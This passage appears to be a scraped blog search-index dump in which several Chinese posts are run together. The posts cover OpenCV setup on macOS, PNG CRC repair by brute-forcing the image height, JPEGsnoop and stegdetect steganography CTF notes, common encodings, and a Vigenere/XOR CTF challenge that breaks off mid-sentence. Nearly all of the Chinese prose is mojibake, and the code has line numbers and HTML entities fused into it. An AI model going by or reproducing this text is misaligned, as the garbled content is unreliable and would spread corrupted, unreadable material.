ZN2cv7imwriteERKNS_6StringERKNS_11_InputArrayERKNSt316vectorIiNS6_9allocatorIiEEEE nm -g main.o | grep imwrite &#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;usr&#x2F;bin&#x2F;nm: error: main.o: No such file or directory. è¿™ä¸ªæŠ¥é”™éœ€è¦æ¢ä¸ªç¼–è¯‘å™¨è§£å†³ check compiler version app: 1/Applications/Clion.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang++ -v 1/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ -v æ¢ä¸ªç¼–è¯‘å™¨ And rebuild&#x2F;reinstall OpenCV with current version of compiler. library: opencv æµ‹è¯•æˆåŠŸæ˜¾ç¤º æµ‹è¯•ä»£ç  æŒ‡å®šbrewçš„æ‰§è¡Œç‰ˆæœ¬ã€‚ å› ä¸ºä¹‹å‰ä¸‹è½½çš„æ˜¯æœ€æ–°çš„ç‰ˆæœ¬4ï¼Œæ‰€ä»¥è¦å…ˆè§£é™¤4çš„é“¾æ¥ 1brew unlink opencv@4 1brew link opencv@3 --force 1brew uninstall opencv 1opencv_version æœ€åæ£€æŸ¥ä¸€ä¸‹ç°åœ¨çš„ç‰ˆæœ¬ tip: ç‰ˆæœ¬3çš„åå­—æ˜¯ å¸è½½æ‰ä¹‹å‰ä¸‹è½½çš„ï¼ˆä»brewä¸‹è½½çš„æœ€æ–°ç‰ˆæœ¬ï¼‰ ç„¶åé“¾æ¥ä¸Šç‰ˆæœ¬3 å›åˆ°cmake 1234567891011cmake_minimum_required(VERSION 3.17)project(watermark_C__14)find_package(OpenCV)include_directories($&#123;OpenCV_INCLUDE_DIRS&#125;)set(CMAKE_CXX_STANDARD 14)set(SOURCE_FILES main.cpp)add_executable(watermark_C__14 $&#123;SOURCE_FILES&#125;)target_link_libraries(watermark_C__14 $&#123;OpenCV_LIBS&#125;) # é“¾æ¥åº“ ç„¶åå°±å¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº† å¯¹clioné‡æ–°åŠ è½½ï¼Œå»ºè®®æœ€å¥½ç”µè„‘é‡å¯ä¸€ä¸‹ã€‚ å…ˆæŒ‡å®šç‰ˆæœ¬ä¸‹è½½opencv3 opencvç‰ˆæœ¬å¤§æ¦‚æ„æ€å°±æ˜¯è¯´ â€˜imgcodecsâ€˜ä»…opencv3+ç‰ˆæœ¬æ”¯æŒã€‚ç„¶åæˆ‘å°±å‘ç°åº”è¯¥æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œæ ¹æ®è¿™ä¸ªå¯å‘ã€‚é€šè¿‡homebrewå¯¹opencvç‰ˆæœ¬è¿›è¡Œé‡æ–°æ•´ç† It took me a week to solve this problemâ€¦ I want to share my solution with you in detail so fewer people would get stuck with this situation.In my case, the problem lies in the conflict between opencv2 and opencv3. My ubuntu was installed with opencv 2.4.9 before by someone else, but I didnâ€™t manage to find the build file of it and uninstall it. I learned somewhere that â€˜imgcodecsâ€™ only exists in opencv 3+, so I realized that caffe must have used opencv2 and then run into this mistake.I used cmake-gui to install opencv 3.4.3 (without clicking BUILD_opencv_world), and CMAKE_INSTALL_PREFIX was set to usr&#x2F;local&#x2F;opencv343 (whatever u like, just set to be separated from opencv2, which was installed in the default path). Then add usr&#x2F;local&#x2F;opencv343&#x2F;lib to â€˜sudo gedit &#x2F;etc&#x2F;ld.so.conf.d&#x2F;opencv.confâ€™, and add â€˜PKG_CONFIG_PATH&#x3D;$PKG_CONFIG_PATH:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;pkgconfig export PKG_CONFIG_PATHâ€™ to â€˜sudo gedit &#x2F;etc&#x2F;bash.bashrcâ€™.Then put â€˜usr&#x2F;local&#x2F;opencv343&#x2F;includeâ€™ and â€˜usr&#x2F;local&#x2F;opencv343&#x2F;libâ€™ behind the â€˜(PYTHON INCLUDE)â€™ and â€˜(PYTHON LIB)â€™ in the makefile.config respectively (before other paths).This works for me, where my ubuntu has both opencv 2 and 3. Hope it would work for you guys too. åŸè¯æ˜¯è¿™æ ·çš„ã€‚ åæ¥å‘ç°æ˜¯opencvåº“çš„é—®é¢˜ï¼Œåœ¨githubä¸Šæ‰¾åˆ°äº†ä¸€ç‚¹å¯å‘ cannot find -lopencv_imgcodecs è¿è¡ŒåˆæŠ¥é”™äº† å“¦ï¼å¤©å‘ï¼é¡ºæ»‘é¡ºæ»‘é¡ºæ»‘ï¼ brew å’Œ gccéƒ½æ›´æ–°å¥½ï¼Œå¹¶ä¸”ä¿®æ”¹æ–°è·¯å¾„åã€‚ ç¼–è¯‘è¿‡ç¨‹å°±å˜å¾—å´­æ–°ä¸”å¦‚ä¸èˆ¬é¡ºæ»‘ï½å€å„¿çˆ½ï½ æŸ¥çœ‹è‡ªå·±çš„ç‰ˆæœ¬å·ï¼Œåœ¨Clionä¸­ä¿®æ”¹complierè·¯å¾„ è¿›å…¥ Clionè¦ä¿®æ”¹é…ç½®ï¼Œä¸ç„¶ç¼–è¯‘çš„æ—¶å€™å¯èƒ½ä¼šå‡ºç°æŠ¥é”™ã€‚gccç‰ˆæœ¬æ›´æ–°é—®é¢˜ cmake å°†æ—§çš„å®‰è£…åŒ…æ¸…ç†æ‰ brew cleanup brew æ›´æ–°åå¯ä»¥ç”¨ æç¤ºå‡ºç°äº†ä¸€ç‚¹å°æŠ¥é”™ï¼ŒæŒ‰ç…§æç¤ºç»§ç»­å®‰è£… äºæ˜¯æˆ‘æ›´æ¢äº†homebrewé•œåƒæºã€‚æ›¿æ¢Homebrewæº. æ›¿æ¢homebrew-coreæº. æˆ‘å‡ºç°äº†Undefined symbols for architecture x86_64: çš„æŠ¥é”™ æŠ¥é”™ é€šè¿‡pipå®‰è£… 1sudo python3 -m pip install opencv-python æ£€éªŒæ˜¯å¦å®‰è£…æˆåŠŸ åœ¨itermä¸‹è¾“å…¥ python3 12import cv2print(cv2.__version__) å¦‚æœæ˜¾ç¤ºç‰ˆæœ¬å·åˆ™å®‰è£…æˆåŠŸ pythonå®‰è£…opencvåº“projectçš„åå­—ï¼Œè‡ªå·±å‘½åï¼Œæˆ‘è¿™é‡Œå–çš„æ˜¯opencvã€‚ä½ è‡ªå·±å‘½ååï¼Œè¦ç›¸åº”çš„ä¿®æ”¹cmake &quot;OpenCV 4.x+ requires enabled C++11 support&quot;![Screen Shot 2020-08-23 at 10.29.49 AM](/Users/KarlieLee/Library/Application Support/typora-user-images/Screen Shot 2020-08-23 at 10.29.49 AM.png) cmakeæ–‡ä»¶é…ç½® ä½¿ç”¨C++11æ ‡å‡† clioné…ç½®opencvç¯å¢ƒè¦ä¸‹è½½çš„åŒ…å¾ˆå¤šï¼Œæ…¢æ…¢ç­‰ä¼šã€‚","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"}],"author":"Gryffinbit"},{"title":"CRCæ ¡éªŒ","slug":"CRCæ ¡éªŒ","date":"2020-11-14T17:39:10.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2020/11/15/CRCæ ¡éªŒ/","permalink":"https://gryffinbit.top/2020/11/15/CRC%E6%A0%A1%E9%AA%8C/","excerpt":"","text":"CRCæ£€éªŒé”™è¯¯pngcheck -v åˆ†æpngæ ¼å¼ï¼ŒæŠ¥é”™CRC ERROR å¯¹ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡ï¼Œé€šè¿‡ä¿®æ”¹å…¶å®½åº¦æˆ–è€…é«˜åº¦éšè—ä¿¡æ¯ï¼Œä½¿è®¡ç®—å‡ºçš„CRCæ ¡éªŒç ä¸åŸå›¾çš„CRCæ ¡éªŒç ä¸ä¸€è‡´ï¼›windowsçš„å›¾ç‰‡æŸ¥çœ‹å™¨ä¼šå¿½ç•¥é”™è¯¯çš„CRCæ ¡éªŒç ï¼Œå› æ­¤ä¼šæ˜¾ç¤ºå›¾ç‰‡ï¼Œä½†æ­¤æ—¶çš„å›¾ç‰‡å·²ç»æ˜¯ä¿®æ”¹è¿‡çš„ï¼Œæ‰€ä»¥ä¼šæœ‰æ˜¾ç¤ºä¸å…¨æˆ–æ‰­æ›²ç­‰æƒ…å†µï¼Œå€Ÿæ­¤å¯ä»¥éšè—ä¿¡æ¯ã€‚ è€ŒLinuxã€macOSä¸‹çš„å›¾ç‰‡æŸ¥çœ‹å™¨ä¸ä¼šå¿½ç•¥é”™è¯¯çš„CRCæ ¡éªŒç ï¼Œå› æ­¤ç”¨Linuxæ‰“å¼€ä¿®æ”¹è¿‡å®½æˆ–é«˜çš„pngå›¾ç‰‡æ—¶ï¼Œä¼šå‡ºç°æ‰“ä¸å¼€çš„æƒ…å†µ pngæ ¼å¼ï¼š å‰å…«ä¸ªå­—èŠ‚ 89 50 4E 47 0D 0A 1A 0A ä¸ºpngçš„æ–‡ä»¶å¤´ï¼Œ è¯¥æ®µæ ¼å¼æ˜¯å›ºå®šçš„ å‰å››ä¸ªå­—èŠ‚00 00 00 0Dï¼ˆå³ä¸ºåè¿›åˆ¶çš„13ï¼‰ä»£è¡¨æ•°æ®å—çš„é•¿åº¦ä¸º13ï¼Œæ•°æ®å—åŒ…å«äº†pngå›¾ç‰‡çš„å®½é«˜ç­‰ä¿¡æ¯ï¼Œè¯¥æ®µæ ¼å¼æ˜¯å›ºå®šçš„ ä¹‹åçš„å››ä¸ªå­—èŠ‚49 48 44 52ï¼ˆå³ä¸ºASCIIç çš„IHDRï¼‰æ˜¯æ–‡ä»¶å¤´æ•°æ®å—çš„æ ‡ç¤ºï¼Œè¯¥æ®µæ ¼å¼ä¹Ÿæ˜¯å›ºå®šçš„ æ•°æ®å—æ ¼å¼ï¼ˆåä¸‰å­—èŠ‚ï¼‰ï¼š 00 00 05 8C è¯¥å››å­—èŠ‚ä¸ºå›¾ç‰‡çš„å®½ï¼Œè¯¥æ®µæ•°æ®æ˜¯ç”±å›¾ç‰‡çš„å®é™…å®½å†³å®šçš„ 00 00 01 f4ï¼ˆ 00000406åŸå›¾ï¼‰è¯¥å››å­—èŠ‚ä¸ºå›¾ç‰‡çš„é«˜ï¼Œè¯¥æ®µæ•°æ®æ˜¯ç”±å›¾ç‰‡çš„å®é™…é«˜åº¦å†³å®šçš„ åäº”å­—èŠ‚08 06 00 00 00 å‡‘æ»¡åä¸‰å­—èŠ‚ï¼Œæ•°æ®å— å†å¾€åå››ä½æ˜¯CRCæ ¡éªŒç 94F3FED1 æ ¡éªŒç æ˜¯ç”±IHDRæ–‡ä»¶å¤´æ ‡ç¤ºä¸å®½é«˜å…±åŒè®¡ç®—å‡ºæ¥çš„æ‰€ä»¥ï¼Œä¸€æ—¦ä¿®æ”¹é«˜æˆ–å®½ï¼Œä¾¿ä¸ç¬¦åˆæ ¡éªŒç äº†ï¼Œå°±ä¼šå‡ºé”™ çˆ†ç ´ï¼Œæ‰¾å‡ºæ­£ç¡®çš„é«˜å¯ä»¥é€‰æ‹©çˆ†ç ´çš„æ–¹æ³•ï¼Œæ‰¾å‡ºä¿®æ”¹å‰çš„é«˜åº¦æ¥åŒ¹é…CRCæ ¡éªŒç ï¼Œç”¨æ­£ç¡®çš„å®½é«˜ä¿®å¤ 1234567891011121314151617# -*- coding: utf-8 -*-import binasciiimport struct#\\x49\\x48\\x44\\x52\\x00\\x00\\x02\\xA7\\x00\\x00\\x01\\x00\\x08\\x06\\x00\\x00\\x00crc32key = 0x6D7C7135for i in range(0, 65535): height = struct.pack(&#x27;&gt;i&#x27;, i) #CRC: 6D7C7135 #æŠŠheightçš„ä½ç½®ç•™å‡ºæ¥ï¼Œdataå‡å»å››å­—èŠ‚ data = &#x27;\\x49\\x48\\x44\\x52\\x00\\x00\\x02\\xA7&#x27; + height + &#x27;\\x08\\x06\\x00\\x00\\x00&#x27; crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print &#x27;&#x27;.join(map(lambda c: &quot;%02X&quot; % ord(c), height))","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"}],"author":"Gryffinbit"},{"title":"Jpegsnoop","slug":"Jpegsnoop","date":"2020-11-14T17:25:27.000Z","updated":"2024-11-12T06:59:34.000Z","comments":true,"path":"2020/11/15/Jpegsnoop/","permalink":"https://gryffinbit.top/2020/11/15/Jpegsnoop/","excerpt":"","text":"github é¡¹ç›®é“¾æ¥ https://github.com/ImpulseAdventure/JPEGsnoop å¯å‚è€ƒjpegçš„æ ¼å¼è¯¦è§£ JPEGåŸç†ç®€ä»‹æ–‡ä»¶æ ¼å¼ JPEGæ–‡ä»¶å¤§ä½“ä¸Šå¯ä»¥åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼šæ ‡è®°ç å’Œå‹ç¼©æ•°æ® æ ‡è®°ç ï¼š ç”±ä¸¤ä¸ªå­—èŠ‚æ„æˆï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯å›ºå®šå€¼0xFFï¼Œåä¸€ä¸ªå­—èŠ‚åˆ™æ ¹æ®ä¸åŒæ„ä¹‰æœ‰ä¸åŒæ•°å€¼ åœ¨æ¯ä¸ªæ ‡è®°ç ä¹‹å‰å¯ä»¥æ·»åŠ æ•°ç›®ä¸é™çš„æ— æ„ä¹‰çš„0xFFå¡«å……ï¼Œè¿ç»­çš„å¤šä¸ª0xFFå¯ä»¥è¢«ç†è§£ä¸ºä¸€ä¸ª0xFFï¼Œå¹¶è¡¨ç¤ºä¸€ä¸ªæ ‡è®°ç çš„å¼€å§‹ å¸¸è§çš„æ ‡è®°ç ï¼š SOI 0xD8 å›¾åƒå¼€å§‹ APP0 0xE0 åº”ç”¨ç¨‹åºä¿ç•™æ ‡è®°0 APPn 0xE1 - 0xEF åº”ç”¨ç¨‹åºä¿ç•™æ ‡è®°n(n&#x3D;1ï½15) DQT 0xDB é‡åŒ–è¡¨(Define Quantization Table) SOF0 0xC0 å¸§å¼€å§‹(Start Of Frame) DHT 0xC4 å®šä¹‰Huffmanè¡¨(Define Huffman Table) DRI 0XDD å®šä¹‰å·®åˆ†ç¼–ç ç´¯è®¡å¤ä½çš„é—´éš”(Define Restart Interval) SOS 0xDA æ‰«æå¼€å§‹(Start Of Scan) EOI 0xD9 å›¾åƒç»“æŸ å‹ç¼©æ•°æ®ï¼š å‰ä¸¤ä¸ªå­—èŠ‚ä¿å­˜æ•´ä¸ªæ®µçš„é•¿åº¦ï¼ŒåŒ…æ‹¬è¿™ä¸¤ä¸ªå­—èŠ‚ æ³¨ï¼š è¿™ä¸ªé•¿åº¦çš„è¡¨ç¤ºæ–¹æ³•æŒ‰ç…§é«˜ä½åœ¨å‰ï¼Œä½ä½åœ¨åï¼Œä¸PNGæ–‡ä»¶çš„é•¿åº¦è¡¨ç¤ºæ–¹æ³•ä¸åŒ ä¾‹å¦‚é•¿åº¦æ˜¯0x12ABï¼Œå­˜å‚¨é¡ºåºä¸º0x12ï¼Œ0xAB Jpegsnoopè½¯ä»¶jpegsnoopçš„ä½¿ç”¨ çœ‹æ˜¯å¦æœ‰æ³¨é‡Šï¼Œæ˜¯å¦æœ‰info æœ€åä¸€è¡Œï¼Œåˆ†æå›¾ç‰‡å¾—åˆ°ï¼Œåœ¨EOFæ•°æ®å—åæœ‰å¤šä½™çš„å†…å®¹ï¼Œå¹¶ä¸”æ ‡æ³¨å‡ºäº†èŒƒå›´ æ ¹æ®è¿™ä¸ªèŒƒå›´ï¼Œhexæ‰“å¼€å›¾ç‰‡ï¼Œå¾—åˆ°ä¸€ä¸ªbase64ï¼ˆå³ä¾§ï¼‰ è½¬æ¢base64ï¼Œå¾—åˆ°flag flag{hahahaha_is_so_funny}","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"}],"author":"Gryffinbit"},{"title":"stegdetect","slug":"stegdetect","date":"2020-11-14T17:18:25.000Z","updated":"2024-11-12T06:59:14.000Z","comments":true,"path":"2020/11/15/stegdetect/","permalink":"https://gryffinbit.top/2020/11/15/stegdetect/","excerpt":"","text":"åœ¨kaliä¸‹ githubé¡¹ç›® https://github.com/abeluck/stegdetect åŸç†ç®€ä»‹æ–‡ä»¶æ ¼å¼ JPEGæ–‡ä»¶å¤§ä½“ä¸Šå¯ä»¥åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼šæ ‡è®°ç å’Œå‹ç¼©æ•°æ® æ ‡è®°ç ï¼š ç”±ä¸¤ä¸ªå­—èŠ‚æ„æˆï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯å›ºå®šå€¼0xFFï¼Œåä¸€ä¸ªå­—èŠ‚åˆ™æ ¹æ®ä¸åŒæ„ä¹‰æœ‰ä¸åŒæ•°å€¼ åœ¨æ¯ä¸ªæ ‡è®°ç ä¹‹å‰å¯ä»¥æ·»åŠ æ•°ç›®ä¸é™çš„æ— æ„ä¹‰çš„0xFFå¡«å……ï¼Œè¿ç»­çš„å¤šä¸ª0xFFå¯ä»¥è¢«ç†è§£ä¸ºä¸€ä¸ª0xFFï¼Œå¹¶è¡¨ç¤ºä¸€ä¸ªæ ‡è®°ç çš„å¼€å§‹ å¸¸è§çš„æ ‡è®°ç ï¼š SOI 0xD8 å›¾åƒå¼€å§‹ APP0 0xE0 åº”ç”¨ç¨‹åºä¿ç•™æ ‡è®°0 APPn 0xE1 - 0xEF åº”ç”¨ç¨‹åºä¿ç•™æ ‡è®°n(n&#x3D;1ï½15) DQT 0xDB é‡åŒ–è¡¨(Define Quantization Table) SOF0 0xC0 å¸§å¼€å§‹(Start Of Frame) DHT 0xC4 å®šä¹‰Huffmanè¡¨(Define Huffman Table) DRI 0XDD å®šä¹‰å·®åˆ†ç¼–ç ç´¯è®¡å¤ä½çš„é—´éš”(Define Restart Interval) SOS 0xDA æ‰«æå¼€å§‹(Start Of Scan) EOI 0xD9 å›¾åƒç»“æŸ å‹ç¼©æ•°æ®ï¼š å‰ä¸¤ä¸ªå­—èŠ‚ä¿å­˜æ•´ä¸ªæ®µçš„é•¿åº¦ï¼ŒåŒ…æ‹¬è¿™ä¸¤ä¸ªå­—èŠ‚ æ³¨ï¼š è¿™ä¸ªé•¿åº¦çš„è¡¨ç¤ºæ–¹æ³•æŒ‰ç…§é«˜ä½åœ¨å‰ï¼Œä½ä½åœ¨åï¼Œä¸PNGæ–‡ä»¶çš„é•¿åº¦è¡¨ç¤ºæ–¹æ³•ä¸åŒ ä¾‹å¦‚é•¿åº¦æ˜¯0x12ABï¼Œå­˜å‚¨é¡ºåºä¸º0x12ï¼Œ0xAB stegdetectçœ‹ç”¨ä»€ä¹ˆå·¥å…·ä¿®æ”¹åŠ å¯†è¿‡ æ˜¾ç¤ºæœ‰å¤šå‡ºçš„34å­—èŠ‚ï¼Œhexæ‰“å¼€åï¼Œå®šä½ï¼Œæ‰¾åˆ°è¯¥å¤šä½™çš„å­—èŠ‚ï¼ˆç»™å‡ºåœ¨C0å‰æœ‰34å­—èŠ‚æ— æ„ä¹‰å¡«å……ï¼Œå¯ä»¥æ•°å‡ºæ¥ C0æŒ‡çš„æ˜¯FFC0ï¼‰ æ ¹æ®jpegçš„æ ¼å¼ï¼Œåœ¨æ¯ä¸ªæ ‡è®°ç ä¹‹å‰å¯ä»¥æ·»åŠ æ•°ç›®ä¸é™çš„æ— æ„ä¹‰çš„0xFFå¡«å……ï¼Œ æ‰€ä»¥æˆ‘åœ¨FFD8å¼€å§‹ï½FFC0ç»“æŸå‰ï¼Œéšè—äº†ä¸€æ®µpayloadã€‚ å¾—åˆ°ä¸€ä¸²åå…­è¿›åˆ¶æ•°ï¼Œå½“æ—¶é¢˜ç›®ç»™äº†æç¤º2 or 3 æ¨å‡º 1. å…¶å®æ˜¯æƒ³ç»™æç¤ºï¼Œè¿™ä¸²æ•°å­—ï¼Œå®é™…æ˜¯åè¿›åˆ¶æ•°ï¼Œè¦æŠŠå®ƒå…ˆè½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚æœ€åè½¬æ¢æˆasciiç ","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"}],"author":"Gryffinbit"},{"title":"å¸¸è§ç¼–ç ","slug":"å¸¸è§ç¼–ç ","date":"2020-11-14T17:01:14.000Z","updated":"2024-11-12T07:00:19.000Z","comments":true,"path":"2020/11/15/å¸¸è§ç¼–ç /","permalink":"https://gryffinbit.top/2020/11/15/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/","excerpt":"","text":"å¸¸è§çš„ç¼–ç ##base64 é•¿åº¦æ˜¯3çš„å€æ•°ï¼Œä¸è¶³æ—¶ç»“å°¾ç”¨&#x3D; è¡¥å…¨ ##xxencode ä¸base64ç›¸ä¼¼ã€‚ ä½†ç»“å°¾ç”¨+ è¡¥å…¨ uuencodeç‰¹æ®Šç¬¦å·å¾ˆå¤š ##jjencode é’ˆå¯¹JavaScriptçš„ç¼–ç æ–¹å¼ è½¬æ¢æˆåªæœ‰ç¬¦å·çš„å­—ç¬¦ä¸² ##aaencode é’ˆå¯¹JavaScriptçš„ç¼–ç æ–¹å¼ è½¬æ¢æˆå¸¸ç”¨çš„ç½‘ç»œè¡¨æƒ… ###ç»´å‰å°¼äºšå¯†ç  ç”±ä¸€äº›åç§»é‡ä¸åŒçš„å‡¯æ’’å¯†ç ç»„æˆã€‚ ï¼ˆå¤šè¡¨å¯†ç çš„ç®€å•å½¢å¼ï¼‰ åŠ å¯†è¿‡ç¨‹ï¼š å¯†é’¥æ˜¯ç”±å­—æ¯ç»„æˆã€‚ å°†å¯†é’¥å¾ªç¯ï¼Œå½¢æˆå¯†é’¥æµï¼Œé•¿åº¦ä¸æ˜æ–‡ä¸€è‡´ æ ¹æ®æ¯ä½å¯†é’¥å¯¹æ˜æ–‡åŠ å¯†ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä½å¯†é’¥æ˜¯Lï¼Œå¯¹åº”ç¬¬12ä¸ªå­—æ¯ï¼Œæ‰€ä»¥åç§»é‡ä¸º12-1&#x3D;11 æ‰€ä»¥ç¬¬ä¸€ä½çš„æ˜æ–‡åŠ å¯†è§„åˆ™ä¸º ï¼ˆA+11ï¼‰mod 26 å³ åç§»é‡ä¸º11çš„å‡¯æ’’å¯†ç ã€‚ åé¢åŒç† http://atomcated.github.io/Vigenere/","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"å¤å…¸å¯†ç ","slug":"å¤å…¸å¯†ç ","permalink":"https://gryffinbit.top/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"}],"author":"Gryffinbit"},{"title":"ç»´å‰å°¼äºšå¯†ç å˜ä½“","slug":"ç»´å‰å°¼äºšå¯†ç å˜ä½“","date":"2020-11-14T16:57:09.000Z","updated":"2024-11-12T07:00:01.000Z","comments":true,"path":"2020/11/15/ç»´å‰å°¼äºšå¯†ç å˜ä½“/","permalink":"https://gryffinbit.top/2020/11/15/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81%E5%8F%98%E4%BD%93/","excerpt":"","text":"åŸé¢˜ï¼š It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)Tips:1.The encode pragram is given;2.Do u no index of coincidence ï¼Ÿ3.The key is last 6 words of the plain text(with â€œnctf{}â€ when submitted, also without any interpunction) åŠ å¯†ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031 #include &lt;stdio.h&gt; #define KEY_LENGTH 2 // Can be anything from 1 to 13main()&#123; unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = &#123;0x00, 0x00&#125;; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen(&quot;ptext.txt&quot;, &quot;r&quot;); fpOut = fopen(&quot;ctext.txt&quot;, &quot;w&quot;); i=0; while (fscanf(fpIn, &quot;%c&quot;, &amp;ch) != EOF) &#123; /* avoid encrypting newline characters */ /* In a &quot;real-world&quot; implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create &quot;production-quality&quot; code =) */ if (ch!=&#x27;\\\\n&#x27;) &#123; fprintf(fpOut, &quot;%02X&quot;, ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; &#125; &#125; fclose(fpIn); fclose(fpOut); return;&#125; å¯ä»¥çœ‹å‡ºï¼Œè¿™é“é¢˜çš„åŠ å¯†æ–¹å¼æ˜¯ç»´å‰å°¼äºšå¯†ç çš„å˜ä½“ã€‚ åŸå…ˆçš„ç»´å‰å°¼äºšåŠ å¯†ï¼Œæ˜¯æŒ‡å®šä¸€ä¸ªå¯†é’¥ï¼Œç„¶åå°†å¯†é’¥å¾ªç¯ä¸åŸæ–‡ä¸­æ¯ä¸€ä¸ªå­—æ¯å¯¹åº”ï¼Œè¿™ä¸ªå­—æ¯åç§»å¯†é’¥åœ¨å­—æ¯è¡¨ä¸­çš„åºå·åçš„æ–°å­—æ¯å³ä¸ºæœ€ç»ˆç»“æœã€‚å¦‚å›¾ï¼š è€Œè¿™é“é¢˜æ˜¯ç”¨1åˆ°14ä¸ªé•¿åº¦èŒƒå›´å†…ï¼ŒæœªçŸ¥çš„å¯†é’¥ï¼Œä¸€ä¸€ï¼Œå¹¶ä¸”å¾ªç¯ä¸æ˜æ–‡å¼‚æˆ–ï¼Œè·³è¿‡æ¢è¡Œç¬¦ï¼Œå°†æ¯ä¸€ä½å¼‚æˆ–çš„ç»“æœè¾“å‡ºä¸ºä¸¤ä½16ä½æ•°ä½œä¸ºå¯†æ–‡ã€‚ä¸ä¼ ç»Ÿç»´å‰å°¼äºšåç§»çš„åŠ å¯†æ–¹å¼ç›¸æ¯”ï¼Œä½¿ç”¨äº†å¼‚æˆ–çš„å½¢å¼æ¥åŠ å¯†åŸæ–‡ã€‚ ç»´å‰å°¼äºšå¯†ç å›é¡¾è¦è§£è¿™é“é¢˜ï¼Œå…ˆå›é¡¾ä¼ ç»Ÿç»´å‰å°¼äºšå¯†ç çš„è§£å¯†å½¢å¼ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œä¸å‡¯æ’’å¯†ç ä¸åŒä¹‹å¤„åœ¨äºï¼Œç»´å‰å°¼äºšå¯†ç ä¸­ï¼Œä¸€ä¸ªå­—æ¯å¯èƒ½ç”Ÿæˆå‡ ä¸ªä¸åŒçš„å¯†æ–‡ï¼Œå› æ­¤ï¼Œä¸èƒ½åƒå‡¯æ’’å¯†ç é‚£æ ·ç”¨è½®è½¬å¯†æ–‡çš„æ–¹æ³•æ¥ç ´è§£ç»´å‰å°¼äºšå¯†ç ã€‚è¦ç ´è§£ç»´å‰å°¼äºšå¯†ç ï¼Œé¦–å…ˆè¦ç†è§£åˆ°ï¼Œè™½ç„¶ç»´å‰å°¼äºšå¯†ç æ‰“ä¹±äº†å­—æ¯ä¸å¯†æ–‡ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œä½†åŒä¸€ä½å¯†é’¥æ‰€å¯¹åº”çš„ä¸åŒå¯†æ–‡ï¼Œå´æœ‰ç€ç›¸åŒçš„åç§»é‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœçŸ¥é“äº†å¯†é’¥çš„é•¿åº¦ï¼Œé‚£æ¯ä¸€ä½å¯†é’¥æ‰€åŠ å¯†çš„é‚£ä¸€ç»„å¯†æ–‡å°±åƒæ˜¯å‡¯æ’’å¯†ç é‚£æ ·æœ‰ç›¸åŒçš„åç§»é‡ã€‚ æ‰€ä»¥å¦‚æœèƒ½æ‰¾å‡ºå¯†é’¥çš„é•¿åº¦ï¼Œé‚£æˆ‘ä»¬å°±èƒ½å°†å¯†æ–‡åˆ†éš”æˆå‡ ç»„ç”±ä¸åŒåç§»é‡å‡¯æ’’åŠ å¯†æ‰€å½¢æˆçš„å¯†æ–‡ã€‚ åˆæœ‰ï¼Œåœ¨è‡ªç„¶è‹±è¯­ä¸­ï¼Œå„ä¸ªå­—æ¯çš„ä½¿ç”¨é¢‘ç‡ä¸åŒï¼Œå³ä¸€äº›å­—æ¯ä½¿ç”¨é¢‘ç‡é«˜äº›ï¼Œå¦ä¸€äº›å­—æ¯ä½¿ç”¨é¢‘ç‡ä½äº›ã€‚æ¯”å¦‚è¯´ï¼Œå­—æ¯eçš„ä½¿ç”¨é¢‘ç‡æœ€é«˜ï¼Œçº¦0.12ï¼Œå­—æ¯zçš„ä½¿ç”¨é¢‘ç‡æœ€ä½ï¼Œä¸º0.00074ã€‚æ®æ­¤ï¼Œå°±å¯ä»¥åˆ†åˆ«ç»Ÿè®¡å‡ºå‰è¿°å‡ 